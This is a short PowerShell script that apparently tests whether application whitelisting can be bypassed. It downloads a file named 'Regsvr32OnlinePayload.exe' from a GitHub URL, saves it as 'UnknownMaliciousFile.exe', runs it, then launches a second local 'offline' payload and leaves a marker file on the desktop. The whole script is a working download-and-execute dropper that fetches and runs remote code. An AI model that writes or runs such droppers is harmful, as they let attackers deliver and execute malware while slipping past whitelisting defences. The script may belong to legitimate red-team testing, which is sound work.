$url = 'https://github.com/NotSurprised/LoremIpsumDolorSitAmetconsEctetur/raw/master/Payload/Regsvr32Bypass/Regsvr32OnlinePayload.exe'
$output = "UnknownMaliciousFile.exe"
$start_time = Get-Date

[ Net.ServicePointManager ]::SecurityProtocol  = [Net.SecurityProtocolType]::Tls12 

wget $url -outfile $output

Write-Output "Time taken: $((Get-Date).Subtract($start_time).Seconds) second(s)"

Start-Process -FilePath "UnknownMaliciousFile.exe"

Start-Process -FilePath "Regsvr32OfflinePayload.exe"

$DesktopPath = [Environment]::GetFolderPath('Desktop');echo Regsvr32OnlineScriptBypass. >> $DesktopPath\\WLtester.txt